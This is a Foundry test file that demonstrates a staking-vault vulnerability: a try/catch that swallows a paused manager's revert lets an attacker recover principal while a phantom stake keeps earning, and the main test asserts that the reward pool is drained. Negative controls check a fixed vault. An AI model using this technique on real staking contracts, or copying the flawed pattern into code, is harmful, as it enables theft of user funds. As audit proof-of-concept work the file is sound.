// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {
    Exploit,
    StakeVault,
    StakeVaultFixed,
    StakeManager,
    MiniToken,
    IERC20,
    IStakeManager
} from "./65325-malicious-actors-can-get-free-rewards-if-contract-gets-pause.sol";

contract FreeRewardsOnPauseTest is Test {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant OTHER = 0x2222222222222222222222222222222222222222;

    uint256 internal constant STAKE_AMOUNT = 1000 ether;
    uint256 internal constant REWARD_POOL = 1000 ether;
    // reward = STAKE_AMOUNT * 500 / 10000 = 5% = 50e18
    uint256 internal constant EXPECTED_REWARD = 50 ether;

    // ── Attack: paused manager -> catch path -> phantom stake -> free rewards ──
    function test_exploit_pausedLeaveGivesFreeRewards() public {
        Exploit e = new Exploit();
        e.run();

        // Attacker recovered their full staked principal...
        assertEq(e.attackerStakingRestored(), STAKE_AMOUNT, "attacker principal fully restored");
        // ...AND extracted free reward tokens despite holding no live stake...
        assertEq(e.attackerRewardStolen(), EXPECTED_REWARD, "attacker drained free rewards");
        assertGt(e.attackerRewardStolen(), 0, "free rewards extracted");
        // ...because the manager STILL records the vault as staked (the desync).
        assertEq(e.phantomStakeRecorded(), STAKE_AMOUNT, "manager retains phantom stake");

        // The reward pool really shrank by the stolen amount.
        MiniToken reward = MiniToken(e.rewardTokenAddr());
        assertEq(reward.balanceOf(e.managerAddr()), REWARD_POOL - EXPECTED_REWARD, "reward pool drained");
        assertEq(reward.balanceOf(ATTACKER), EXPECTED_REWARD, "attacker holds the stolen rewards");

        // And the vault genuinely gave the staked tokens back to the attacker.
        MiniToken staking = MiniToken(e.stakingTokenAddr());
        assertEq(staking.balanceOf(e.vaultAddr()), 0, "vault returned all staked tokens");
    }

    // ── Negative control A: same VULNERABLE vault, NO pause ──
    // The try-branch runs: stakeManager.leave() succeeds and clears the stake,
    // so a later redeemRewards pays 0. No free rewards.
    function test_control_noPause_noFreeRewards() public {
        (StakeVault vault, StakeManager manager, MiniToken staking, MiniToken reward) = _deployVulnerable();

        _stake(address(vault), staking, STAKE_AMOUNT);

        // No pause here.
        vault.leave(ATTACKER);

        // Stake was properly cleared, principal returned, and rewards are 0.
        assertEq(manager.staked(address(vault)), 0, "stake cleared on clean leave");
        assertEq(staking.balanceOf(ATTACKER), STAKE_AMOUNT, "principal returned");

        uint256 reward_ = manager.redeemRewards(address(vault), ATTACKER);
        assertEq(reward_, 0, "no rewards on a properly-cleared stake");
        assertEq(reward.balanceOf(ATTACKER), 0, "attacker gets no free rewards without the pause desync");
    }

    // ── Negative control B: FIXED vault (try/catch removed), WITH pause ──
    // The paused-manager revert now propagates: leave() reverts as a whole, so
    // the attacker cannot recover tokens and there is no desync to farm.
    function test_control_fixed_pausedLeaveReverts() public {
        MiniToken staking = new MiniToken("Staking", "STK");
        MiniToken reward = new MiniToken("Reward", "STOLEN-REWARD");
        StakeManager manager =
            new StakeManager(IERC20(address(staking)), IERC20(address(reward)), address(this));
        StakeVaultFixed vault =
            new StakeVaultFixed(address(this), IStakeManager(address(manager)), IERC20(address(staking)));

        reward.mint(address(manager), REWARD_POOL);
        staking.mint(address(this), STAKE_AMOUNT);
        staking.approve(address(vault), STAKE_AMOUNT);
        vault.stake(STAKE_AMOUNT, 0);

        manager.pause();

        // Fixed leave() propagates the paused revert instead of swallowing it.
        vm.expectRevert(StakeManager.StakeManager__Paused.selector);
        vault.leave(ATTACKER);

        // Nothing was returned and rewards remain unfarmable: attacker holds nothing.
        assertEq(staking.balanceOf(ATTACKER), 0, "fixed vault returns no tokens while paused");
        uint256 reward_ = manager.redeemRewards(address(vault), ATTACKER);
        // The stake is still recorded, but the attacker never got their principal
        // back, so there is no "free rewards + principal" harm — the two remain
        // coupled exactly as intended.
        assertGt(reward_, 0, "stake still recorded, but principal is locked in the vault");
        assertEq(staking.balanceOf(address(vault)), STAKE_AMOUNT, "principal remains locked in the vault");
    }

    // ---- helpers ----

    function _deployVulnerable()
        internal
        returns (StakeVault vault, StakeManager manager, MiniToken staking, MiniToken reward)
    {
        staking = new MiniToken("Staking", "STK");
        reward = new MiniToken("Reward", "STOLEN-REWARD");
        manager = new StakeManager(IERC20(address(staking)), IERC20(address(reward)), address(this));
        vault = new StakeVault(address(this), IStakeManager(address(manager)), IERC20(address(staking)));
        reward.mint(address(manager), REWARD_POOL);
    }

    function _stake(address vault, MiniToken staking, uint256 amount) internal {
        staking.mint(address(this), amount);
        staking.approve(vault, amount);
        StakeVault(vault).stake(amount, 0);
    }
}
